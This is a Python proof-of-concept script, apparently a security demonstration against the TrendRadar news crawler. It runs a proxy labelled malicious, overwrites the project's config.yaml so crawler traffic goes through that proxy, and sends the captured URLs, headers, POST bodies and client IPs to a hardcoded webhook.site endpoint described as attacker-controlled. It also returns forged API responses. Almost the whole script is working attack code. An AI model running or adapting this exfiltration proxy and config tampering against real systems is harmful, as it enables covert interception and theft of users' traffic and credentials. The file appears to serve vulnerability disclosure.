#!/usr/bin/env python3
"""
LIVE SSRF DEMONSTRATION - webhook.site Data Exfiltration

This demonstrates a real SSRF attack where:
1. Attacker sets up malicious proxy
2. Proxy intercepts all crawler traffic
3. Proxy exfiltrates data to webhook.site (attacker-controlled)
4. Attacker receives sensitive information

WEBHOOK.SITE TEST ENDPOINT:
https://webhook.site/a78b922a-7974-4346-bba9-bc7caae13d93

This script creates a malicious proxy that:
- Intercepts all HTTP requests from the crawler
- Logs request details (URL, headers, body)
- Forwards data to webhook.site for attacker monitoring
- Optionally proxies to real destination (stealthy) or drops requests
"""

import json
import sys
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
import requests
import time

# ATTACKER-CONTROLLED WEBHOOK
EXFILTRATION_WEBHOOK = "https://webhook.site/a78b922a-7974-4346-bba9-bc7caae13d93"

class MaliciousSSRFProxy(BaseHTTPRequestHandler):
    """
    Malicious proxy that exfiltrates all traffic to webhook.site
    """

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

    def exfiltrate_to_webhook(self, request_data):
        """Send exfiltrated data to webhook.site"""
        try:
            requests.post(
                EXFILTRATION_WEBHOOK,
                json=request_data,
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            print(f"[EXFILTRATED] Data sent to webhook.site")
        except Exception as e:
            print(f"[ERROR] Failed to exfiltrate: {e}")

    def do_GET(self):
        """Intercept GET requests"""
        print("\n" + "="*70)
        print("[!] INTERCEPTED GET REQUEST")
        print("="*70)

        # Extract request details
        request_data = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "method": "GET",
            "url": self.path,
            "headers": dict(self.headers),
            "client_ip": self.client_address[0],
            "attack_type": "SSRF via Proxy Configuration",
            "severity": "HIGH",
            "description": "TrendRadar crawler traffic intercepted via malicious proxy"
        }

        print(f"URL: {self.path}")
        print(f"Client: {self.client_address[0]}")
        print(f"Headers: {json.dumps(dict(self.headers), indent=2)}")

        # Exfiltrate to webhook.site
        self.exfiltrate_to_webhook(request_data)

        # Check if this is the external API request
        if "newsnow.busiyi.world" in self.path or "api/s" in self.path:
            print("\n[!!!] CRITICAL: External API request intercepted!")
            print("[!!!] Attacker now knows:")
            print("     - Platform IDs being queried")
            print("     - Request timing and patterns")
            print("     - Source IP address")
            print("     - User-Agent strings")

            # For demo, return fake data instead of proxying to real API
            # This prevents actually hitting the external API
            fake_response = {
                "status": "success",
                "items": [
                    {
                        "title": "[INTERCEPTED] This response was hijacked by malicious proxy",
                        "url": "https://webhook.site/a78b922a-7974-4346-bba9-bc7caae13d93"
                    }
                ]
            }

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(fake_response).encode())
        else:
            # For other requests, send minimal response
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK - Intercepted by malicious proxy')

    def do_POST(self):
        """Intercept POST requests"""
        print("\n" + "="*70)
        print("[!] INTERCEPTED POST REQUEST")
        print("="*70)

        # Read POST body
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='ignore')

        # Extract request details
        request_data = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "method": "POST",
            "url": self.path,
            "headers": dict(self.headers),
            "body": body[:1000],  # First 1000 chars
            "client_ip": self.client_address[0],
            "attack_type": "SSRF via Proxy Configuration",
            "severity": "HIGH"
        }

        print(f"URL: {self.path}")
        print(f"Client: {self.client_address[0]}")
        print(f"Body (truncated): {body[:200]}")

        # Exfiltrate to webhook.site
        self.exfiltrate_to_webhook(request_data)

        # Send response
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status":"success"}')

    def do_CONNECT(self):
        """Handle HTTPS CONNECT for SSL interception"""
        print("\n" + "="*70)
        print("[!] INTERCEPTED HTTPS CONNECT")
        print("="*70)
        print(f"Target: {self.path}")

        request_data = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "method": "CONNECT",
            "target": self.path,
            "client_ip": self.client_address[0],
            "attack_type": "SSRF - HTTPS Interception Attempt",
            "note": "HTTPS traffic cannot be fully intercepted without SSL MITM"
        }

        # Exfiltrate connection attempt
        self.exfiltrate_to_webhook(request_data)

        # Accept the CONNECT but don't fully proxy (would need SSL MITM)
        self.send_response(200, 'Connection Established')
        self.end_headers()


def run_malicious_proxy(port=8888):
    """Run the malicious SSRF proxy server"""
    print("="*70)
    print(" MALICIOUS SSRF PROXY SERVER")
    print(" Exfiltration Target: webhook.site")
    print("="*70)
    print()
    print(f"[*] Starting malicious proxy on port {port}...")
    print(f"[*] All intercepted data will be sent to:")
    print(f"    {EXFILTRATION_WEBHOOK}")
    print()
    print("[*] To view intercepted data, visit:")
    print(f"    https://webhook.site/#!/a78b922a-7974-4346-bba9-bc7caae13d93")
    print()
    print("="*70)
    print(" ATTACK SCENARIO")
    print("="*70)
    print()
    print("1. Attacker modifies config/config.yaml:")
    print("   crawler:")
    print(f"     use_proxy: true")
    print(f"     default_proxy: \"http://127.0.0.1:{port}\"")
    print()
    print("2. Victim runs crawler (or MCP trigger_crawl)")
    print()
    print("3. All traffic flows through this malicious proxy:")
    print("   Crawler → Malicious Proxy → webhook.site (exfiltration)")
    print()
    print("4. Attacker receives:")
    print("   - All request URLs and parameters")
    print("   - Request headers (may contain auth)")
    print("   - Source IP addresses")
    print("   - Timing information")
    print()
    print("="*70)
    print()
    print("[*] Press Ctrl+C to stop the proxy")
    print("[*] Waiting for victim to send traffic...")
    print()

    try:
        server = HTTPServer(('0.0.0.0', port), MaliciousSSRFProxy)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Proxy stopped")
    except Exception as e:
        print(f"[!] Error: {e}")


def create_malicious_config(proxy_port=8888):
    """Create a malicious config.yaml for SSRF attack"""
    print("="*70)
    print(" CREATING MALICIOUS CONFIGURATION")
    print("="*70)
    print()

    malicious_config = f"""# MALICIOUS CONFIG - SSRF ATTACK
# This config redirects all crawler traffic through attacker's proxy

app:
  version_check_url: "https://raw.githubusercontent.com/sansan0/TrendRadar/refs/heads/master/version"
  show_version_update: true

crawler:
  request_interval: 1000
  enable_crawler: true
  use_proxy: true  # [!] ATTACKER ENABLED PROXY
  default_proxy: "http://127.0.0.1:{proxy_port}"  # [!] ATTACKER'S MALICIOUS PROXY

report:
  mode: "current"
  rank_threshold: 5

notification:
  enable_notification: false
  message_batch_size: 4000
  dingtalk_batch_size: 20000
  feishu_batch_size: 29000
  batch_send_interval: 3
  feishu_message_separator: "━━━━━━━━━━━━━━━━━━━"

  push_window:
    enabled: false
    time_range:
      start: "20:00"
      end: "22:00"
    once_per_day: true
    push_record_retention_days: 7

  webhooks:
    feishu_url: ""
    dingtalk_url: ""
    wework_url: ""
    telegram_bot_token: ""
    telegram_chat_id: ""
    email_from: ""
    email_password: ""
    email_to: ""
    email_smtp_server: ""
    email_smtp_port: ""
    ntfy_server_url: "https://ntfy.sh"
    ntfy_topic: ""
    ntfy_token: ""

weight:
  rank_weight: 0.6
  frequency_weight: 0.3
  hotness_weight: 0.1

platforms:
  - id: "zhihu"
    name: "知乎"
  - id: "weibo"
    name: "微博"
"""

    # Backup original config
    import shutil
    from pathlib import Path

    config_path = Path("config/config.yaml")
    backup_path = Path("config/config.yaml.backup")

    if config_path.exists() and not backup_path.exists():
        shutil.copy(config_path, backup_path)
        print(f"[*] Backed up original config to: {backup_path}")

    # Write malicious config
    with open(config_path, "w") as f:
        f.write(malicious_config)

    print(f"[*] Created malicious config at: {config_path}")
    print()
    print("[!] ATTACK CONFIGURED")
    print(f"[!] Proxy set to: http://127.0.0.1:{proxy_port}")
    print("[!] All crawler traffic will be intercepted")
    print()
    print("To restore original config:")
    print(f"  mv {backup_path} {config_path}")
    print()


def demonstrate_attack():
    """Demonstrate complete SSRF attack"""
    print()
    print("="*70)
    print(" SSRF ATTACK DEMONSTRATION")
    print(" Live Exfiltration to webhook.site")
    print("="*70)
    print()
    print("This demonstration will:")
    print("  1. Start a malicious proxy server (port 8888)")
    print("  2. Modify config.yaml to use the malicious proxy")
    print("  3. Guide you to trigger the crawler")
    print("  4. Intercept all traffic and send to webhook.site")
    print()
    print("ATTACK FLOW:")
    print("  Crawler → Malicious Proxy (localhost:8888) → webhook.site")
    print()
    print("[*] View intercepted data at:")
    print("    https://webhook.site/#!/a78b922a-7974-4346-bba9-bc7caae13d93")
    print()

    choice = input("Start attack demonstration? (y/n): ").strip().lower()
    if choice != 'y':
        print("[*] Aborted")
        return

    # Create malicious config
    print()
    create_malicious_config(proxy_port=8888)

    print("="*70)
    print(" NEXT STEPS")
    print("="*70)
    print()
    print("1. Keep this proxy server running (in this terminal)")
    print()
    print("2. In another terminal, trigger the crawler:")
    print("   Option A - Run main.py:")
    print("     python3 main.py")
    print()
    print("   Option B - Use MCP trigger_crawl:")
    print("     # Start MCP server")
    print("     python3 mcp_server/server.py --transport http --port 3333")
    print("     # Then call trigger_crawl")
    print()
    print("3. Watch this terminal for intercepted requests")
    print()
    print("4. Check webhook.site for exfiltrated data:")
    print("   https://webhook.site/#!/a78b922a-7974-4346-bba9-bc7caae13d93")
    print()
    print("="*70)
    print()

    # Run the malicious proxy
    run_malicious_proxy(port=8888)


if __name__ == "__main__":
    demonstrate_attack()
